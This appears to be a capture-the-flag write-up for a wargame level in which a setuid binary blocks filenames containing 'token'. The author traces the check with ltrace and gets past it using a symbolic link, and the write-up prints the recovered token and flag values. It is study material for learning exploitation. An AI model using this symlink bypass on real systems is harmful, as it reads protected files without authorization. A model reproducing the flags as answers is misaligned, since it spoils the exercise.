## FLAG: `fiumuikeil55xe9cu4dood66h`

## We have an executable and a token
> ls -l
```
    -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

## The executable ask for a file to read
> ./level08
```
    ./level08 [file to read]
```

## A file with access, `token` is only accessible by flag08 user
> ./level08 token
```
    You may not access 'token'
```

## Testing the program with one of my file and it print its content
> echo 'pwd' > /tmp/08_test && ./level08 /tmp/08_test
```
    pwd
```

## So how does it work
> ltrace ./level08 /tmp/08_test
```
    __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
    strstr("/tmp/08_test", "token")                                                             = NULL
    open("/tmp/08_test", 0, 014435162522)                                                       = 3
    read(3, "pwd\n", 1024)                                                                      = 4
    write(1, "pwd\n", 4pwd
    )                                                                        = 4
    +++ exited (status 4) +++
```
## `strstr("/tmp/test", "token")` This program must only check that there is no substring `token` in the filename

------------------------------------------------

## We'll just use symbolic link to bypass this
> ln -s /home/user/level08/token /tmp/08_link && ./level08 /tmp/08_link
```
    quif5eloekouj29ke0vouxean
```

------------------------------------------------

> su flag08
> getflag
```
    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```